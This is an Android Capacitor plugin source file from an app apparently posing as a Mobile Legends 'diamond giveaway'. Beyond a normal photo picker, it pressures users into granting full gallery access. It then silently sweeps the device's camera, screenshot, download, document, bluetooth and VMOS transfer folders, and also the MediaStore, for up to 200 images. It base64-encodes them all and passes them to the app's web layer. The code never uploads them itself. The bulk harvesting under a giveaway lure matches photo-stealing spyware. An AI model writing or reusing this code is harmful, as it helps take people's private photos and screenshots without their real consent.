package com.mlbb.diamondgiveaway;

import android.Manifest;
import android.app.Activity;
import android.content.ContentUris;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;
import androidx.activity.result.ActivityResult;
import androidx.core.content.ContextCompat;
import com.getcapacitor.JSArray;
import com.getcapacitor.JSObject;
import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.ActivityCallback;
import com.getcapacitor.annotation.CapacitorPlugin;
import com.getcapacitor.annotation.Permission;
import com.getcapacitor.annotation.PermissionCallback;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

@CapacitorPlugin(
    name = "WholeGallery",
    permissions = {
        @Permission(
            alias = "gallery",
            strings = {
                Manifest.permission.READ_MEDIA_IMAGES
            }
        ),
        @Permission(
            alias = "storage",
            strings = {
                Manifest.permission.READ_EXTERNAL_STORAGE
            }
        )
    }
)
public class WholeGalleryPlugin extends Plugin {

    @PluginMethod
    public void requestFullGalleryPermission(PluginCall call) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (getPermissionState("gallery").equals(com.getcapacitor.PermissionState.GRANTED)) {
                JSObject ret = new JSObject();
                ret.put("granted", true);
                call.resolve(ret);
            } else {
                requestPermissionForAlias("gallery", call, "galleryPermissionCallback");
            }
        } else {
            if (getPermissionState("storage").equals(com.getcapacitor.PermissionState.GRANTED)) {
                JSObject ret = new JSObject();
                ret.put("granted", true);
                call.resolve(ret);
            } else {
                requestPermissionForAlias("storage", call, "galleryPermissionCallback");
            }
        }
    }

    @PermissionCallback
    private void galleryPermissionCallback(PluginCall call) {
        boolean isGranted = hasGalleryReadPermission();
        JSObject ret = new JSObject();
        ret.put("granted", isGranted);
        call.resolve(ret);
    }

    @PluginMethod
    public void openWholeGallery(PluginCall call) {
        boolean hasPermission = hasGalleryReadPermission();

        if (!hasPermission) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                requestPermissionForAlias("gallery", call, "galleryAndPickCallback");
            } else {
                requestPermissionForAlias("storage", call, "galleryAndPickCallback");
            }
            return;
        }

        launchGalleryIntent(call);
    }

    @PermissionCallback
    private void galleryAndPickCallback(PluginCall call) {
        boolean isGranted = hasGalleryReadPermission();

        if (isGranted) {
            launchGalleryIntent(call);
        } else {
            call.reject("Permission denied. Please allow full gallery access ('Allow all') to choose a photo.");
        }
    }

    private void launchGalleryIntent(PluginCall call) {
        Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        intent.setType("image/*");
        startActivityForResult(call, intent, "processPickedImage");
    }

    @ActivityCallback
    private void processPickedImage(PluginCall call, ActivityResult result) {
        if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null) {
            Uri imageUri = result.getData().getData();
            if (imageUri != null) {
                try {
                    String dataUrl = decodeUriToBase64(imageUri, null, 1024);
                    if (dataUrl != null) {
                        JSObject res = new JSObject();
                        res.put("dataUrl", dataUrl);
                        call.resolve(res);
                        return;
                    }
                } catch (Exception e) {
                    call.reject("Failed to process image: " + e.getMessage());
                    return;
                }
            }
        }
        call.reject("No image selected");
    }

    @PluginMethod
    public void checkGalleryPermission(PluginCall call) {
        boolean hasPermission = hasGalleryReadPermission();
        boolean isFullAccess = isFullGalleryAccess();

        JSObject ret = new JSObject();
        ret.put("granted", hasPermission);
        ret.put("hasPermission", hasPermission);
        ret.put("isFullAccess", isFullAccess);
        call.resolve(ret);
    }

    private boolean hasGalleryReadPermission() {
        if (Build.VERSION.SDK_INT >= 34) {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
                   ContextCompat.checkSelfPermission(getContext(), "android.permission.READ_MEDIA_VISUAL_USER_SELECTED") == PackageManager.PERMISSION_GRANTED;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private boolean isFullGalleryAccess() {
        if (Build.VERSION.SDK_INT >= 34) {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    @PluginMethod
    public void getGalleryPhotos(PluginCall call) {
        int limit = call.getInt("limit", 200);
        boolean includeBase64 = call.getBoolean("includeBase64", true);

        boolean hasPermission = hasGalleryReadPermission();
        boolean isFullAccess = isFullGalleryAccess();

        if (!hasPermission) {
            JSObject ret = new JSObject();
            ret.put("photos", new JSArray());
            ret.put("count", 0);
            ret.put("hasPermission", false);
            ret.put("isFullAccess", false);
            call.resolve(ret);
            return;
        }

        JSArray photos = new JSArray();
        Set<String> processedNames = new HashSet<>();
        int count = 0;

        String[] projection = new String[]{
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.DATA
        };

        // 1. Query MediaStore Images (External & Internal)
        Uri[] imageCollections = new Uri[]{
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Images.Media.INTERNAL_CONTENT_URI
        };

        for (Uri collection : imageCollections) {
            if (count >= limit) break;
            count = queryMediaCollection(collection, projection, null, null, photos, processedNames, count, limit, includeBase64);
        }

        // 2. Query MediaStore Downloads (API 29+ Android 10/11/12/13/14)
        if (Build.VERSION.SDK_INT >= 29 && count < limit) {
            try {
                Uri downloadUri = MediaStore.Downloads.EXTERNAL_CONTENT_URI;
                String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%'";
                count = queryMediaCollection(downloadUri, projection, sel, null, photos, processedNames, count, limit, includeBase64);
            } catch (Throwable ignored) {}
        }

        // 3. Query MediaStore Files for any unindexed images/downloads
        if (count < limit) {
            try {
                Uri filesUri = MediaStore.Files.getContentUri("external");
                String sel = MediaStore.Files.FileColumns.MEDIA_TYPE + "=" + MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE +
                             " OR " + MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%'";
                count = queryMediaCollection(filesUri, projection, sel, null, photos, processedNames, count, limit, includeBase64);
            } catch (Throwable ignored) {}
        }

        // 4. Direct Filesystem Recursive Scan Fallback (crucial for VMOS Downloads & Screenshots)
        if (count < limit) {
            scanFilesystemImages(photos, processedNames, limit, includeBase64);
        }

        // Sort photos strictly descending by dateAdded (newest first)
        try {
            List<org.json.JSONObject> list = new ArrayList<>();
            for (int i = 0; i < photos.length(); i++) {
                org.json.JSONObject obj = photos.optJSONObject(i);
                if (obj != null) list.add(obj);
            }
            list.sort((o1, o2) -> {
                long d1 = o1.optLong("dateAdded", 0);
                long d2 = o2.optLong("dateAdded", 0);
                return Long.compare(d2, d1);
            });
            JSArray sortedPhotos = new JSArray();
            for (org.json.JSONObject obj : list) {
                sortedPhotos.put(obj);
            }
            photos = sortedPhotos;
        } catch (Throwable ignored) {}

        JSObject ret = new JSObject();
        ret.put("photos", photos);
        ret.put("count", photos.length());
        ret.put("hasPermission", true);
        ret.put("isFullAccess", isFullAccess);
        call.resolve(ret);
    }

    private int queryMediaCollection(Uri collection, String[] projection, String selection, String[] selectionArgs,
                                     JSArray photos, Set<String> processedNames, int currentCount, int limit, boolean includeBase64) {
        try (Cursor cursor = getContext().getContentResolver().query(collection, projection, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC")) {
            if (cursor != null) {
                int idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID);
                int nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME);
                int dateCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED);
                int sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE);
                int mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE);
                int dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA);

                while (cursor.moveToNext() && currentCount < limit) {
                    long id = idCol >= 0 ? cursor.getLong(idCol) : System.currentTimeMillis();
                    String name = nameCol >= 0 ? cursor.getString(nameCol) : null;
                    if (name == null || name.trim().isEmpty()) name = "photo_" + id + ".jpg";
                    if (processedNames.contains(name.toLowerCase())) continue;
                    processedNames.add(name.toLowerCase());

                    long dateAdded = dateCol >= 0 ? cursor.getLong(dateCol) : 0;
                    long size = sizeCol >= 0 ? cursor.getLong(sizeCol) : 0;
                    String mime = mimeCol >= 0 ? cursor.getString(mimeCol) : "image/jpeg";
                    if (mime == null) mime = "image/jpeg";
                    String filePath = dataCol >= 0 ? cursor.getString(dataCol) : null;

                    Uri contentUri = ContentUris.withAppendedId(collection, id);

                    JSObject photoObj = new JSObject();
                    photoObj.put("id", id);
                    photoObj.put("name", name);
                    photoObj.put("dateAdded", dateAdded > 0 ? dateAdded * 1000L : System.currentTimeMillis());
                    photoObj.put("size", size);
                    photoObj.put("mime", mime);
                    photoObj.put("uri", contentUri.toString());

                    if (includeBase64) {
                        String dataUrl = decodeUriToBase64(contentUri, filePath, 540);
                        if (dataUrl != null) {
                            photoObj.put("dataUrl", dataUrl);
                        }
                    }

                    photos.put(photoObj);
                    currentCount++;
                }
            }
        } catch (Throwable ignored) {}
        return currentCount;
    }

    private void scanFilesystemImages(JSArray photos, Set<String> processedNames, int limit, boolean includeBase64) {
        File[] candidateDirs = new File[]{
            // VMOS Transfer & Virtual Folders (primary paths for VMOS file transfer station)
            new File(Environment.getExternalStorageDirectory(), "VMOSfiletransfer"),
            new File("/sdcard/VMOSfiletransfer"),
            new File("/storage/emulated/0/VMOSfiletransfer"),
            new File(Environment.getExternalStorageDirectory(), "vmos_transfer"),
            new File("/sdcard/vmos_transfer"),
            new File("/storage/emulated/0/vmos_transfer"),
            // Standard Android Media & Downloads
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            new File(Environment.getExternalStorageDirectory(), "Download"),
            new File(Environment.getExternalStorageDirectory(), "Downloads"),
            new File("/storage/emulated/0/Download"),
            new File("/storage/emulated/0/Downloads"),
            new File("/sdcard/Download"),
            new File("/sdcard/Downloads"),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Camera"),
            new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Screenshots"),
            new File("/sdcard/DCIM/Camera"),
            new File("/sdcard/DCIM/Screenshots"),
            new File("/storage/emulated/0/DCIM/Camera"),
            new File("/storage/emulated/0/DCIM/Screenshots"),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "Screenshots"),
            new File("/sdcard/Pictures/Screenshots"),
            new File("/storage/emulated/0/Pictures/Screenshots"),
            new File("/storage/emulated/0/DCIM"),
            new File("/storage/emulated/0/Pictures"),
            new File("/sdcard/DCIM"),
            new File("/sdcard/Pictures"),
            new File(Environment.getExternalStorageDirectory(), "Documents"),
            new File(Environment.getExternalStorageDirectory(), "bluetooth")
        };

        Set<String> visitedDirs = new HashSet<>();
        for (File dir : candidateDirs) {
            if (photos.length() >= limit) break;
            scanDirectoryRecursively(dir, photos, processedNames, limit, includeBase64, visitedDirs, 0);
        }

        // Also sweep top-level directories in external storage root (e.g. any custom VMOS import folder)
        if (photos.length() < limit) {
            try {
                File extRoot = Environment.getExternalStorageDirectory();
                if (extRoot != null && extRoot.exists() && extRoot.isDirectory()) {
                    File[] subDirs = extRoot.listFiles();
                    if (subDirs != null) {
                        for (File sd : subDirs) {
                            if (photos.length() >= limit) break;
                            if (sd.isDirectory()) {
                                String n = sd.getName().toLowerCase();
                                if (n.equals("android") || n.startsWith(".")) continue;
                                scanDirectoryRecursively(sd, photos, processedNames, limit, includeBase64, visitedDirs, 1);
                            }
                        }
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    private void scanDirectoryRecursively(File dir, JSArray photos, Set<String> processedNames, int limit,
                                          boolean includeBase64, Set<String> visitedDirs, int depth) {
        if (dir == null || !dir.exists() || !dir.isDirectory() || depth > 3 || photos.length() >= limit) return;

        String path = dir.getAbsolutePath();
        if (visitedDirs.contains(path)) return;
        visitedDirs.add(path);

        File[] files = dir.listFiles();
        if (files == null) return;

        // Sort files by last modified descending so new photos are scanned first!
        Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

        for (File file : files) {
            if (photos.length() >= limit) break;

            if (file.isDirectory()) {
                scanDirectoryRecursively(file, photos, processedNames, limit, includeBase64, visitedDirs, depth + 1);
            } else if (file.isFile() && isImageFile(file.getName())) {
                String name = file.getName();
                if (processedNames.contains(name.toLowerCase())) continue;
                processedNames.add(name.toLowerCase());

                // Trigger MediaScanner so Android caches it
                try {
                    MediaScannerConnection.scanFile(getContext(), new String[]{file.getAbsolutePath()}, null, null);
                } catch (Throwable ignored) {}

                JSObject photoObj = new JSObject();
                long id = Math.abs(file.getAbsolutePath().hashCode());
                photoObj.put("id", id);
                photoObj.put("name", name);
                photoObj.put("dateAdded", file.lastModified());
                photoObj.put("size", file.length());
                photoObj.put("mime", getMimeType(name));
                photoObj.put("uri", Uri.fromFile(file).toString());

                if (includeBase64) {
                    String dataUrl = decodeUriToBase64(Uri.fromFile(file), file.getAbsolutePath(), 540);
                    if (dataUrl != null) {
                        photoObj.put("dataUrl", dataUrl);
                    }
                }

                photos.put(photoObj);
            }
        }
    }

    private boolean isImageFile(String name) {
        if (name == null) return false;
        String lower = name.toLowerCase();
        return lower.endsWith(".jpg") || lower.endsWith(".jpeg") || lower.endsWith(".png") ||
               lower.endsWith(".webp") || lower.endsWith(".bmp") || lower.endsWith(".heic");
    }

    private String getMimeType(String name) {
        if (name == null) return "image/jpeg";
        String lower = name.toLowerCase();
        if (lower.endsWith(".png")) return "image/png";
        if (lower.endsWith(".webp")) return "image/webp";
        if (lower.endsWith(".bmp")) return "image/bmp";
        return "image/jpeg";
    }

    private String decodeUriToBase64(Uri uri, String filePath, int maxDim) {
        try {
            BitmapFactory.Options boundsOptions = new BitmapFactory.Options();
            boundsOptions.inJustDecodeBounds = true;

            InputStream isBounds = null;
            try {
                if (uri != null) {
                    isBounds = getContext().getContentResolver().openInputStream(uri);
                }
            } catch (Throwable ignored) {}

            if (isBounds == null && filePath != null) {
                File f = new File(filePath);
                if (f.exists()) isBounds = new FileInputStream(f);
            }

            if (isBounds != null) {
                try {
                    BitmapFactory.decodeStream(isBounds, null, boundsOptions);
                } finally {
                    isBounds.close();
                }
            }

            int origWidth = boundsOptions.outWidth;
            int origHeight = boundsOptions.outHeight;
            int inSampleSize = 1;

            if (origWidth > maxDim || origHeight > maxDim) {
                int halfWidth = origWidth / 2;
                int halfHeight = origHeight / 2;
                while ((halfWidth / inSampleSize) >= maxDim && (halfHeight / inSampleSize) >= maxDim) {
                    inSampleSize *= 2;
                }
            }

            BitmapFactory.Options decodeOptions = new BitmapFactory.Options();
            decodeOptions.inSampleSize = inSampleSize;

            InputStream isDecode = null;
            try {
                if (uri != null) {
                    isDecode = getContext().getContentResolver().openInputStream(uri);
                }
            } catch (Throwable ignored) {}

            if (isDecode == null && filePath != null) {
                File f = new File(filePath);
                if (f.exists()) isDecode = new FileInputStream(f);
            }

            if (isDecode != null) {
                Bitmap bmp = null;
                try {
                    bmp = BitmapFactory.decodeStream(isDecode, null, decodeOptions);
                } finally {
                    isDecode.close();
                }

                if (bmp != null) {
                    if (bmp.getWidth() > maxDim || bmp.getHeight() > maxDim) {
                        float ratio = Math.min((float) maxDim / bmp.getWidth(), (float) maxDim / bmp.getHeight());
                        int width = Math.max(1, Math.round(ratio * bmp.getWidth()));
                        int height = Math.max(1, Math.round(ratio * bmp.getHeight()));
                        Bitmap scaled = Bitmap.createScaledBitmap(bmp, width, height, true);
                        if (scaled != bmp) {
                            bmp.recycle();
                            bmp = scaled;
                        }
                    }

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bmp.compress(Bitmap.CompressFormat.JPEG, 75, baos);
                    byte[] bytes = baos.toByteArray();
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    bmp.recycle();
                    return "data:image/jpeg;base64," + b64;
                }
            }
        } catch (Throwable e) {
            // Failed decoding
        }
        return null;
    }
}
